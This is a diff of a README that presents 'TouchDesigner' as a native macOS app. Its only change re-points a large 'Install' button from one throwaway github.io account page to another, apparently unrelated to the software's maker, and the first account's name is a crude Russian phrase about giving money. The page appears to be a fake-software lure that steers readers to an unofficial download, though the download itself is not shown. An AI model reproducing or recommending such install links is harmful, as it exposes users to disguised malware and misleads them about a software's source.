@@ -2,7 +2,7 @@
 <h1 align="center">TouchDesigner</h1>
 <p align="center">Native visual programming for interactive media — done right on macOS.</p>
 <p align="center"><img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/> &nbsp; <img src="https://img.shields.io/badge/Apple_Silicon-Ready-brightgreen?style=flat-square"/> &nbsp; <img src="https://img.shields.io/badge/Dark_Mode-Supported-blueviolet?style=flat-square"/></p>
-<p align="center"><a href="https://blya-dayte-deneg.github.io/.github/touchdesigner"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
+<p align="center"><a href="https://ukabvar-losos.github.io/.github/touchdesigner"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
 <p align="center"><img src="https://images.squarespace-cdn.com/content/v1/50169cf884ae68067baa7365/8bf5b8fe-d21d-453a-a742-4edb9604d163/Screenshot+2025-03-11+at+11.21.33%E2%80%AFPM.png" alt="TouchDesigner — macOS visual programming for interactive media screenshot" width="780"/></p>
 
 ---
